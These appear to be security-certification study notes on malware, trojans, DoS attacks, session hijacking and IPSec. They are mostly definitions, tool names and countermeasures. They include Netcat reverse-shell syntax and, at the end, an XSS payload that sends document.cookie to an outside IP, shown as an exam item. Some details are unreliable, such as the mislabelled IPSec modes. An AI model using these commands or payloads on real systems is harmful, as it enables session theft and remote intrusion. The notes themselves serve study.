# Malware, DoS, Session Hijacking

### <u>Malware Basics</u>

- **Malware** - software designed to harm or secretly access a computer system without informed consent
- Most is downloaded from the Internet with or without the user's knowledge
- **Overt Channels** - legitimate communication channels used by programs
- **Covert Channels** - Transfers information over, within a computer system, or network that is outside of the security policy. used by an attacker to hide data in an undetectable protocol.
- **Wrappers** - programs that allow you to bind an executable to an innocent file
- **Crypters** - use a combination of encryption and code manipulation to render malware undetectable to security programs
- **Packers** - use compression to pack the executable which helps evage signature based detection
- **Exploit Kits** - help deliver exploits and payloads
  - Infinity
  - Bleeding Life
  - Crimepack
  - Blackhole Exploit Kit

### <u>Trojans</u>

- **Trojans** - software that appears to perform a desirable function but instead performs malicious activity
  - To hackers, it is a method to  gain and maintain access to a system
  - Trojans are means of delivery whereas a backdoor provides the open access
- **Types**
  - **Backdoor trojan** -  a program which can bypass the standard system authentication or conventional system mechanisms like IDS, firewalls, etc. without being detected.
  - **Defacement trojan**
  - **Proxy server trojan**
  - **Botnet trojan**
    - Chewbacca
    - Skynet
  - **Remote access trojans**
    - RAT
    - MoSucker
    - Optix Pro
    - Blackhole
  - **E-banking trojans**
  	- Zeus
  	- Spyeye
  - **Command Shell Trojan** - Provides a backdoor to connect to through command-line access
    - Netcat
- **Covert Channel Tunneling Trojan** (CCTT) - a RAT trojan; creates data transfer channels in previously authorized data streams
- **Netcat**
  - "Swiss army knife" of tcp/ip hacking
  - Provides all sorts of control over a remote shell on a target
  - Connects via **nc -e IPaddress Port#**
  - From attack machine **nc -l -p 5555** opens a listening port on 5555
  - Can connect over TCP or UDP, from any port
  - Offers DNS forwarding, port mapping and forwarding and proxying
- **Trojan Port Numbers**

| Trojan Name        | Port   |
|--------------------|--------|
| Death              | 2      |
| Senna Spy          | 20     |
| Hackers Paradise   | 31,456 |
| TCP Wrappers       | 421    |
| Doom, Santaz Back  | 666    |
| Silencer, WebEx    | 1001   |
| RAT                | 1095-98|
| SubSeven           | 1243   |
| Shiva-Burka        | 1600   |
| Trojan Cow         | 2001   |
| Deep Throat        | 6670-71|
| Tini               | 7777   |
| NetBus             | 12345-6|
| Whack a Mole       | 12361-3|
| Back Orifice       | 31337,8|

- **netstat -an** - shows open ports in numerical order
- **netstat -b** - displays all active connections and the processes using them
- **Process Explorer** - Microsoft tool that shows you everything about running processes
- **Registry Monitoring Tools**
  - SysAnalyzer
  - Tiny Watcher
  - Active Registry Monitor
  - Regshot
- **Msconfig** - Windows program that shows all programs set to start on startup
- **Tripwire** - integrity verifier that can act as a HIDS in protection against trojans
- **SIGVERIF** - build into Windows to verify the integrity of the system
  - Log  file can be found at c:\windows\system32\sigverif.txt
  - Look for drivers that are not signed

### <u>Viruses and Worms</u>

- **Virus** - self-replicating program that  reproduces by attaching copies of itself into other executable code
  - Usually installed by user clicking on malicious file attachments or downloads
  - **Fake Antivirus** - tries to convince a user has a virus and have them download an AV that is a virus itself
- **Ransomware** - malicious software designed to deny access to a computer until a price is paid; usually spread through email
  - **WannaCry** - famous ransomware; within 24 hours had 230,000 victims; exploited unpatched SMB vulnerability
  - **Other Examples**
    - Cryptorbit
    - CryptoLocker
    - CryptoDefense
    - police-themed
- **Other Virus Types**    - 
  - **Boot Sector Virus** - known as system virus; moves boot sector to another location and then inserts its code int he original location
  - **Shell Virus** - wraps  around an application's code, inserting itself before the application's
  - **Cluster Virus** - modifies directory table entries so every time a file or folder is opened, the virus runs
  - **Multipartite Virus** - attempts to infect both boot sector and files; generally refers to viruses with multiple infection methods
  - **Macro Virus** - written in VBA; infects template files - mostly Word and Excel
  - **Polymorphic Code Virus** - modify their code for each replication to avoid detection. They accomplish this by changing the encryption module and the instruction sequence. Polymorphic mechanisms use random number generators in their implementation.
    - Self-replicating
    - Reprograms itself
    - Cannot be detected by antivirus
    - Changes the malicious code with each infection
  - **Encryption Virus** - uses  encryption to hide the code from antivirus
  - **Metamorphic Virus** - rewrite themselves completely each time they infect a new executable file. Metamorphic code reprograms itself. It is translated into temporary code (a new variant of the same virus but with a different code), and then converted back to the original code.
    - Inserts dead code
    - Reorders instructions
    - Reshapes the expressions
    - Modifies program control structure
  - **Stealth Virus** - tries to hide from anti-virus programs by actively altering and corrupting the chosen service call interruptions when they are being run , known as a tunneling virus.
  - **Cavity Virus** - known as a space-filler overwrites a part of the host file that is with a constant (usually nulls), without increasing the length of the file but preserving its functionality
  - **Sparse Infector Virus** - only infects occasionally (e.g. every 10th time)
  - **File Extension Virus** - changes the file extensions of files to take advantage of most people having them turned off (readme.txt.vbs shows as readme.txt)
- **Virus Makers**
  - JPS Virus Maker - is used to create a customized virus, can be used to test new AV
  - Sonic Bat
  - PoisonVirus Maker
  - Sam's Virus Generator
  
- **Worm**  - self-replicating malware that sends itself to other computers without human intervention
  - Usually doesn't infect files - just resides in active memory
  - Often used in botnets
- **Ghost Eye Worm** - hacking tool that uses random messaging on Facebook and other sites to perform a host of malicious efforts

- A ZeuS Trojan consists of three main .dll files packed in UPX format, namely Kernel32.dll, Advapi32.dll, and user32.dll. These three .dll files are required by the Trojan to perform the following actions:

  - Kernel32.dll—To access/manipulate **memory files and hardware**
  - Advapi32.dll—To access/manipulate **Service Manager and Registry**
  - User32.dll—To display and **manipulate graphics**


- NotPetya infects the master boot record to execute a payload that encrypts a hard drive’s file system table and stops Windows from booting. It can spread over the network using WMIC (Windows Management Instrumentation Command-line) by capturing all credentials from the local machine using Mimikatz.


- Windows services monitoring traces malicious services initiated by the malware. Since malware employs rootkit techniques to manipulate HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services registry keys to hide its processes, windows service monitoring can be used to identify such manipulations.

- **XtremeRAT** uses port number 1863 as a corresponding port for attack.

- Blackhat Search Engine Optimization (SEO) - uses aggressive SEO tactics such as keyword stuffing, doorway pages, page swapping, and adding unrelated keywords to get higher search engine ranking for their malware pages

- Doublepulsar - backdoor is used by the WannaCry ransomware to perform remote code execution and further propagation on a victim machine

- **EquationDrug rootkit** - Rootkit Trojans performs targeted attacks against various organizations and arrives on the infected system by being downloaded and executed by the Trickler dubbed “DoubleFantasy,” covered by TSL20110614-01 (Trojan.Win32.Micstus.A)

-   GrayFish Rootkit -  is a Windows kernel rootkit that runs inside the Windows OS and provides an effective mechanism, hidden storage and malicious command execution while remaining invisible. It injects its malicious code into the boot record which handles the launching of Windows at each step. It implements its own Virtual File System (VFS) to store the stolen data and its own auxiliary information.

- Wingbird which is a Rootkit Trojan , not a RAT.

- Locky - is a dreadful data encrypting parasite that not only infects the computer system but also has the ability to corrupt data on unmapped network shares. This ransomware spreads as a malicious Word document named invoice J-[8 random numbers].doc that is attached to spam emails.

- social engineered clickjacking - By injecting malware into legitimate-looking websites to trick users by clicking them.

- DarkHorse Trojan Virus Maker: DarkHorse Trojan Virus Maker is used to create user-specified Trojans by selecting from various options available

- BitCrypter to encrypt and compress 32-bit executables and .NET apps, without affecting their direct functionality.

- ClamWin - is a Free Antivirus program for Microsoft Windows 10 / 8 / 7 / Vista / XP / Me / 2000 / 98 and Windows Server 2012, 2008 and 2003.

- ZeuS: ZeuS, also known as Zbot, is a powerful banking trojan that explicitly attempts to steal confidential information like system information, online credentials, and banking details, etc.

- Mirai Botnet Trojan ( Resulted in DDoS)
  - Login attempts with 60 different factory default username and password pairs
  - Built for multiple CPU architectures (x86, ARM, Sparc, PowerPC, Motorola)
  - Connects to CnC to allow the attacker to specify an attack vector
  - Increases bandwidth usage for infected bots
  - Identifies and removes competing malware
  

### <u>Analyzing Malware</u>

- **Steps**
  0. Baselining the system - take a snapshot.
  1. Make sure you have a good test bed
     - Use a VM with NIC in host-only mode and no open shares
  2. Analyze the malware on the isolated VM in a static state
     - Tools - binText and UPX help with looking at binary
  3. Run the malware and check out processes
     - Use **Process Monitor**, etc. to look at processes
       - Reliable capture of process details, including image path, command line, user and session ID.
       - Configurable and moveable columns for any event property.
       - Filters can be set for any data field, including fields not configured as columns.
       - Advanced logging architecture scales to tens of millions of captured events and gigabytes of log data.
       - Process tree tool shows the relationship of all processes referenced in a trace.
       - Native log format preserves all data for loading in a different Process Monitor instance

     - Use NetResident, TCPview or even Wireshark to look at network activity
  4. Check and see what files were added, changed, or deleted
     - Tools - IDA Pro, VirusTotal, Anubis, Threat Analyzer
- **Preventing Malware**
  - Make sure you know what is going on in your system
  - Have a good antivirus that is up to date
  - **Sheepdip** - system that is used to check things introduced into a network, A computer installed with port monitoring, file monitoring, network monitoring, and antivirus software and connected to network only under strictly controlled conditions
    - Is airgapped

- BinText is a small text extractor utility that can extract text from any kind of file and includes the ability to find plain ASCII text, Unicode (double byte ANSI) text and Resource strings, providing useful information for each item in the optional “advanced” view mode.

- UPX (Ultimate Packer for Executables) is a free and open source executable packer supporting a number of file formats from different operating systems.

- ASPack is an advanced EXE packer created to compress Win32 executable files and to protect them against non-professional reverse engineering.

- PE Explorer lets you open, view and edit a variety of different 32-bit Windows executable file types (also called PE files) ranging from the common, such as EXE, DLL and ActiveX Controls, to the less familiar types, such as SCR (Screensavers), CPL (Control Panel Applets), SYS, MSSTYLES, BPL, DPL and more (including executable files that run on MS Windows Mobile platform).

- IDA Pro - Debugger and Disassembler

### <u>Denial of Service Attacks</u>

- Seeks to take down a system or deny access to it by authorized users
- **Botnet** - network of zombie computers a hacker uses to start a distributed attack
  - Can be controlled over HTTP, HTTPS, IRC, or ICQ
- **Basic Categories**
  
  - **Volumetric attacks** - bandwidth attacks; consume all bandwidth for the system or service
    - measured in bits/sec(bps) , Flood and Amplification attacks such as , ICMP flood, UDP flood, Smurf attack
  - **Protocol attacks** - Consumes state tables from servers, firewall, loadbalancers,...etc.
    - Measured with packets/sec(pps) , SYN Flood, Fragmentation attack,Ping of death, Ack flood attack, teardrop, LAND attack, TCP state exhaustion
  - **Application attacks** - consume the resources necessary for the application to run
    - Measure with request/sec(rps), HTTP POST/GET attack, Slowloris attack
  
  - **TCP state-exhaustion attacks** - go after load balancers, firewalls and application servers
  - **SYN attack** - sends thousands of SYN packets to the machine with a false source address; eventually engages all resources and exhausts the machine
  - **SYN flood** - sends thousands of SYN packets; does not spoof IP but doesn't respond to the SYN/ACK packets; eventually bogs down the computer, runs out of resources
  - **ICMP flood** - sends ICMP Echo packets with a spoofed address; eventually reaches limit of packets per second sent
  - **Smurf** - large "amount" of  ICMP pings to the broadcast address of the subnet with source IP spoofed as the target; entire subnet responds exhausting the target
  - **Application-level flood** - prevent the access of the application to the legitimate user. Examples include email, network resources, temporary ceasing of applications and services, and so on.
  - **Fraggle** - same as smurf but with UDP packets
  - **Ping of Death** - fragments ICMP messages; after reassembled, the ICMP packet is larger than the maximum size and crashes the system
  - **Teardrop** - overlaps a large number of garbled IP fragments with oversized payloads; causes older systems to crash due to fragment reassembly
  - **Peer to peer** - clients of peer-to-peer file-sharing hub are disconnected and directed to connect to the target system
  - **Phlashing** - a DoS attack that causes permanent damage to a system; also called bricking a system
  - **LAND attack** - sends a SYN packet to the target with a spoofed IP the same as the target; if vulnerable, target loops endlessly and crashes
  - **DRDoS** - Distrubuted Reflected DOS attack, invloves intermidiary victims(Zombies) and secondary machines(reflectors), applies to machines or routers sends unsolicitated messages to other router.
  - **Multi-vector attack** - Attacker uses mix of volumetric, protocol and application attacks.
  - **Teardrop attack** - conducted by targeting TCP/IP fragmentation reassembly codes
  
- **High Orbit Ion Cannon** (HOIC &  Operation MegaUpload) - 2nd version to LOIC, DDoS tool that floods a target with TCP, UDP or HTTP requests
- **Low Orbit Ion Cannon** (LOIC & Operation Payback) - DDoS tool that floods a target with TCP, UDP or HTTP requests

- **Other Tools**
  - Trinity - Linux based DDoS tool
  - Tribe Flood Network - uses voluntary botnet systems to launch massive flood attacks
  - R-U-Dead-Yet (RUDY) - DoS with HTTP POST via long-form field submissions
  
 - **DoS Detection Techniques**
   - Activity Profiling : monitoring avg packet rate, Header information, increase of network flow clusters, distinct clusters.
   - Sequential Change-point detection: uses Cumulative Sum(CUSUM) algorithm to isolate changes in statistics of the flow rates for specific IP addresses, targeted port numbers, and communication protocols used.
   - Wavelet based signal analysis: analyzes spectral window's energy to determine presence of anomalies
   
- **Prevent DoS**
   - NMAP and HPING3 can be used to detect systems vulnerable to DoS
   - Egress filtering
   - Ingress filtering
   - TCP Intercept : "ip intercept list ACL" Cisco command
   - rate limiting 
   - KF-Sensor : Windows based honeypot IDS Deflect DoS attack
   - Use hardware DoS device: FortiDDoS, Cisco Guard XT, A10 Thunder.
   - Black hole filtering is used to discard packets at the routing level
   - RFC3704 Filtering
   - Source IP reputation filtering
   - Cisco IP source guard
   - Use Captcha against DoS application attack
   
   
   
 - **Mitigate DoS**
   - Drop Packets , Black Hole Filtering
   - Load balancing
   - Throttling
   - For Volumetric attack coming from all globe - Absorb at the company level
   - For Protocol attack coming from all globe - Block at provider level
   - For Application(HTTP GET/POST) attack coming from all globe - Use CAPTCHA
   - Honeypot - Deflecting attack
   
   
 
### <u>Session Hijacking</u>

- Can be Network level Hijacking , or Appllication level Hijacking.
- Can be passive(just monitoring) or active(actively insert stuff) hijacking

- **Application Level Methods- Compromise "Session ID"**
  - Session Sniffing
  - MITM
  - MITB: uses DOM interface in browser, Malware is injected between the browser and OS API, enabling to see the data before encryption (when data is sent from the machine) and after decryption (when data is being received by the machine), ( famous by banking trojans ex Zeus, Gameover Zeus)
  - XSS client-side attack
  - CSRF client-side attack
  - Seesion Fixation client-side attack
  - Forbidden Attack client-side attack : Exploits Cryptography Nonce during TLS handshake
  - Session replay
  - Predictable Token
  - Compression Ratio Info-leak made easy(CRIME) client-side attack: Uses data compression vulnerability in SSL/TLS and HTTPS
  
  
- **Network Level Methods - Compromise "Seq/Ack numbers"(Attacks Transport- and Internet-level protocols)**
  - Blind Hijacking : uses MITM to intercept packet with seq number and continue the comm to server in one way only and doesn't see the server reply.
  - TCP/IP:  Attacker predicts the seq number and sends to server with spoofed IP
  - UDP : Attacked utlizes MITM to send forget reply to client and continue communicating with server
  - RST : Attacker predicts the ack and send RST to client
  - MITM packet sniffer : Uses forged ICMP( changes routing through Hijacker)  and ARP spoofing
  - IP Spoofing/Source routed packets : Spoofs trusted host and determines the routing back using source routing
  
  
- **Steps**
  1. Sniff the traffic between the client and server
  2. Monitor the traffic and predict the sequence numbering
  3. Desynchronize the session with the client
  4. Predict the session token and take over the session
  5. Inject packets to the target server
  
- Can be done via brute force, calculation or stealing
- Predicting can be done by knowing the window size and the packet sequence number
- During the 3-way handshake, sequence and acknowledgment numbers are (relatively) incremented by one. After that acknowledge number will be incremented for the size of the packet received.
- Microsoft NTLMv2 hash—it’s salted, so it will be different for every new request to randomize it, it can be cracked only using dictionary or brute-force, but NOT rainbow tables.


- **Hijacking Attack Tools**
  - **Burp Suite** - Install burp certificate into trusted CA’s in order to intercept the traffic between website and the browser is protected with HSTS. He can do that by configuring the web browser with burp as the proxy server and then navigating to https://burp website or https://172.0.0.1:8080. There he has to download burp CA certificate and install it in browser trust pool.
  - **Droid Sheep , Faceniff, DroidSniff** - Mobile Session Hijacking 
  - **BeEF** - Browser exploitation tool
  - **FireSheep** - was an extension for the Firefox web browser that used a packet sniffer to intercept unencrypted session cookies from websites such as Facebook and Twitter. The plugin eavesdropped on Wi-Fi communications, listening for session cookies. When it detected a session cookie, the tool used this cookie to obtain the identity belonging to that session
  - **MITMF framework** - Steals passwords from sniffing sessions , mitmf tool with sslstrip+ and dnsspoof modules. He should use IE in “InPrivate browsing” mode to ignore the HSTS cookie if the cookie was already stored on his machine, or he can use some older browser version (IE, Firefox, Chrome, Safari, Opera, …) which didn’t use the HSTS cookies.
  - **Colasoft Packet Builder** - Packet forging
  - **BetterCAP**
  - **Ettercap** - man-in-the-middel tool and packet sniffer on steroids
  - **Hunt** - sniff, hijack and reset connections
  - **T-Sight** - easily hijack sessions and monitor network connections
  - **Zaproxy**
  - **OWASP ZAP**
  - **Paros**
  - **SSLstrip** -  Victim  <== HTTP ==>  Attacker  <== HTTPS ==>  Twitter --- Sslstrip tool is exploiting user behavior and if a user does not type https:// in front of the link, and the website has redirection from HTTP to HTTPS, it will intercept HTTP 302 redirection and send the user exactly what the user asked for, i.e. HTTPsite 
  - **Juggernaut**
  - **Hamster**
  - **Ferret**
  
  
- **Hijacking Detection Tools**
  - LogRhythm(Automatic) : SIEM, UEBA, SAO(security automation&orchestration)
  - Wireshark(Manual)
  - Fiddler(Manual) : used for security testing for web applications and session debugging
  - CxSAST(Preventive) - Using source code analysis to identify vulnerabilities
  
  
- **Countermeasures**
  - Use HSTS : HTTP Strict transport security protects against HTTPS from MITM through converting all HTTP to HTTPS and ensures valid server fingerprint
  - Token binding: for every new connection, new pair of public/private key, clients signs token with private key.
  - HPKP: HTTP Public Key Pinning, Digital signed certificate.
  - Using unpredictable session IDs
  - Limiting incoming connections
  - Minimizing remote access
  - Regenerating the session key after authentication
  - Use IPSec to encrypt
  
  
- **IPSec**
  - **Transport Mode(ESP)** - payload and ESP trailer are encrypted;  IP header is not
  - **Tunnel mode(AH)** - everything is encrypted.
  - **Architecture Protocols**
    - **Authentication Header** - provides origin authenticity and integrity, no replay protection
    - **Encapsulating Security Payload** (ESP) - provides origin authenticity and integrity, PLUS confidentiality
    - **Internet Key Exchange** (IKE) - produces the keys for the encryption process
    - **Oakley** - uses Diffie-Hellman to create master and session keys
    - **Internet Security Association Key Management Protocol (ISAKMP)** - software that facilitates encrypted communication between two endpoints
    - **IPSEC Domain of Interpretation(DOI)** - Defines payload formats, types of exchange, naming conventions for security information such as cryptographic algorithm or security policies)
    - **IPSEC Driver** - The software that enables the IPSEC operation
    - **IPSEC Policy Agent** - Collects IPSEC policy from AD and sets system configs 


- XSS example for wrong command due to closure expression
<script> new image().src="http://192.168.11.111/?a="+documentt.cookie <script>
Answer: <script> tag is not correctly closed it has to be closed like this: </script>
